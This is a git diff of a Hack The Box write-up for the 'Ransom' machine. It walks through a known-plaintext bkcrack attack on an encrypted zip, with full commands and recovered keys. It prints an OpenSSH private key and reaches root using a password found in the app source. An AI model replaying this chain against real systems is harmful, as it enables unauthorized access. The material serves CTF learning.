@@ -1,8 +1,8 @@
 
 
-### Tools:
+### Tools: Bkcrack
 
-### Vulnerabilities: 
+### Vulnerabilities: Type Juggling: JSON, Zip Cracking, Creds in config files
 
 You know what shows a webpage and SSH as per usual.
 
@@ -53,6 +53,7 @@ The /register page also has alot of info and where I spent most of my time. This
 ```
 The main page is a login. Simple enough but most of my tricks did not work.
 
+![image](https://user-images.githubusercontent.com/105310322/197065584-2347fc55-4161-4ac3-a481-b54c24264ebf.png)
 
 
 
@@ -142,12 +143,21 @@ Login Successful
 
 After confirming the successful login capture a fresh request in Burp and input the same data then forward to reach the next page.
 
+Theres the user.txt flag that we found earlier and a zip file that we should probably download.
 
 
+![image](https://user-images.githubusercontent.com/105310322/197065618-f2d48eee-baec-473c-8858-1d9bb38148f4.png)
 
 
+Upon downloading the zip file and trying to unzip it we learn that it is encrypted. From a previous challenge that I did, I learned of a tool called bkcrack that can crack zip files.
 
 
+Download the bkcrack repository from github and follow the tutorial.md. It is very helpful.
+
+https://github.com/kimci86/bkcrack
+
+
+First we are going to list out all the files to see what we can access. They have ssh keys that we definiteley want!
 
 ```console
 └─$ ./bkcrack -L uploaded-file-3422.zip 
@@ -168,11 +178,30 @@ Index Encryption Compression CRC32    Uncompressed  Packed size Name
    10 ZipCrypto  Deflate     396b04b4         2009          581 .viminfo
 ```
 
-Because the /.bash_logout file was too large to decrypt with it required me to put it in a zip file.
+What bkcrack needs to work is at least 12 bytes of plaintext to attempt to crack the zip file. However even though I was giving it more than enough I was having some issues finding the keys I needed.
 
+Eventually I settled on using the my own .bash_logout file but that was too large to use even though both files were the same size.
+
+This means I needed to zip my own file to make it small enough to read.
+
+Next we are going to copy our .bash_logout and create a zip file out of it.
+
+```console
 └─$ cp ~/.bash_logout bash
 └─$ zip bash.zip bash
+```
 
+Then we use
+
+-p for our plaintext file
+-P for our plaintext zip file
+-c for the file we are attacking
+-C for the encrypted zip file
+
+Note: I followed to tutorial but it suggests using an offset to help with plaintext. Because we had the whole file we did not need this.
+
+
+Doing it correctly will give you the keys you need for our last step.
 ```console
 └─$ ./bkcrack -p bash -P bash.zip -c .bash_logout -C uploaded-file-3422.zip         
 bkcrack 1.4.0 - 2022-05-19
@@ -184,6 +213,9 @@ Keys: 7b549874 ebc25ec5 7e465e18
 [15:42:04] Keys
 7b549874 ebc25ec5 7e465e18
 ```
+Following the tutorial we can decrypt the entire zip file by putting it into our own. 
+
+Create a zip file and run the following command.
 
 ```console
 └─$ ./bkcrack -C uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 -U ransom.zip pass
@@ -192,6 +224,7 @@ bkcrack 1.4.0 - 2022-05-19
 100.0 % (9 / 9)
 Wrote unlocked archive.
 ```
+Then unzip your own to have access to all of the files!
 
 ```console
 └─$ unzip ransom.zip            
@@ -207,6 +240,9 @@ Archive:  ransom.zip
   inflating: .ssh/id_rsa.pub         
   inflating: .viminfo  
   ```
+
+We get a users ssh key.
+
 ```
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
@@ -248,11 +284,14 @@ RIHIz+LEYAPdFZAAAAE2h0YkB1YnVudHUtdGVtcGxhdGUBAgMEBQYH
 -----END OPENSSH PRIVATE KEY-----
 ```
 
+and the public key has a username of htb.....
 
 ```
 └─$ cat .ssh/id_rsa.pub 
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrDTHWkTw0RUfAyzj9U3Dh+ZwhOUvB4EewA+z6uSunsTo3YA0GV/j6EaOwNq6jdpNrb9T6tI+RpcNfA+icFj+6oRj8hOa2q1QPfbaej2uY4MvkVC+vGac1BQFs6gt0BkWM9JY7nYJ2y0SIibiLDDB7TwOx6gem4Br/35PW2sel8cESyR7JfGjuauZM/DehjJJGfqmeuZ2Yd2Umr4rAt0R4OEAcWpOX94Tp+JByPAT5m0CU557KyarNlW60vy79njr8DR8BljDtJ4n9BcOPtEn+7oYvcLVksgM4LB9XzdDiXzdpBcyi3+xhFznFKDYUf6NfAud2sEWae7iIsCYtmjx6Jr9Zi2MoUYqWXSal8o6bQDIDbyD8hApY5apdqLtaYMXpv+rMGQP5ZqoGd3izBM9yZEH8d9UQSSyym/te07GrCax63tb6lYgUoUPxVFCEN4RmzW1VuQGvxtfhu/rK5ofQPac8uaZskY3NWLoSF56BQqEG9waI4pCF5/Cq413N6/M= htb@ransom
 ```
+
+Create your ssh key file and login.
 
 ```console
 └─$ ssh htb@ransom.htb -i .ssh/id_rsa
@@ -276,9 +315,11 @@ To check for new updates run: sudo apt update
 Last login: Mon Jul  5 11:34:49 2021
 htb@ransom:~$ 
 ```
-I noticed a .git file and I was intrigued however since there were so many files in this directory I decided to try and find a password first.
+I looked around for a bit but found no low hanging fruits. Linpeas found some DB creds but there wasnt a SQL server being ran. It did find that we could possibly abuse pkexec with sudo and the suid bit set. So finding a password became my goal.
 
-Alot of information showed up but one of them stood out as a possible password. ```UHC-March-Global-PW!```
+I noticed a .git directory and I was intrigued since .git on these HTB machines often have good info hiding. However since there were so many files in this directory I decided to try and find a password a simpler and lazy way.
+
+After greping the entirety of /srv/prod a lot of information showed up but one of them stood out as a possible password. ```UHC-March-Global-PW!```
 
 ```console
 htb@ransom:/srv/prod$ grep -r "password"
@@ -289,6 +330,7 @@ app/Http/Controllers/AuthController.php:        if ($request->get('password') ==
 
 I was hoping to gain sudo permissions with this password so I could possible abuse pkexec but what I got was even better. Root's own password!
 
+
 ```
 htb@ransom:/srv/prod$ su root
 Password:
@@ -296,5 +338,7 @@ root@ransom:/srv/prod# cat /home/htb/user.txt
 db28****************************
 root@ransom:/srv/prod# cat /root/root.txt
 58b0****************************
-
 ```
+Not too bad of a machine, the type juggling portion was not so easily discovered but otherwise I enjoyed it.
+
+GG!
